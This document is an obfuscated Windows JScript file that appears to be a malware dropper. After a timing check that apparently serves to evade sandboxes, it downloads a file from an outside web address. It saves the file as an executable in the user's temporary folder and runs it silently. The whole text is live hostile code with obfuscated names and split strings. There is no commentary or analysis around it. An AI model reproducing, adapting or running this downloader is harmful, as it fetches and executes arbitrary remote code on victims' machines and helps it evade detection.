var R = false;
var h = "CreateObject";
var s = function o() {return WScript[h]("WScript.Shell");}(), z = 11;
var j = "MSXML2.XMLHTTP";
var S = 2123213;
var P = 0;
function xr(P0){s["Run"](P0, P, P);};
function re(){return "" + j;};
function O(v1, aG){P = P * 1; return v1 - aG;};
function gq(){return h;};
/*@cc_on
  @if (@_win32 || @_win64)
    R = true;
  @end
@*/
if (R)
{
var b = "";
function K(){return 22;};
var lJ0 = 0; var VH = 0;
function H()
{
var yW = new this["Date"]();
var U = yW["getUTCMilliseconds"]();
WScript["Sleep"](K());
var yW = new this["Date"]();
var Dy = yW["getUTCMilliseconds"]();
WScript["Sleep"](K());
var yW = new this["Date"]();
var VS = yW["getUTCMilliseconds"]();
var lJ0 = "I";
lJ0 = O(Dy, U);
var VH = "VP";
VH = O(VS, Dy);
b = "open";
return O(lJ0, VH);
}
var Lb = false;
var GL = false;
for (var v = P; v < K() * 1; v++){if (H() != P){
Lb = true; 
VH = "31" + 11 * lJ0 + VH; 
GL = true; 
break;
}}
function yA() {return ((Lb == true) && (Lb == GL)) ? 1 : P;};
if (Lb && yA() && GL){
function G() {return s["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "CXJIVuexMN9Rczmk.exe";};
 c = re();
 U0 = WScript[h](c);
 var lJ = 1;
 while (lJ){
try {
U0[b]("GET", "http://caferacerpneus.com.br/lw2osd", false);
U0["send"]();
d = "Sleep";
for (;;){WScript[d](K() * 11); if (U0["readystate"] >= 2 * 2) break;};
lJ = P;
} catch(v0){};
}
function qM(Bq) {var vq = (1, 2, 3, 4, 5, Bq); return vq;};
PF = WScript[gq()]("ADODB.Stream");
c = PF;
c[b]();
c["type"] = qM(1);
c["write"](U0["ResponseBody"]);
PF["position"] = qM(P);
c["Save" + "ToFile"](G(), 2);
PF["c"+"lose"]();
zM = G();
xr(zM);
}
}

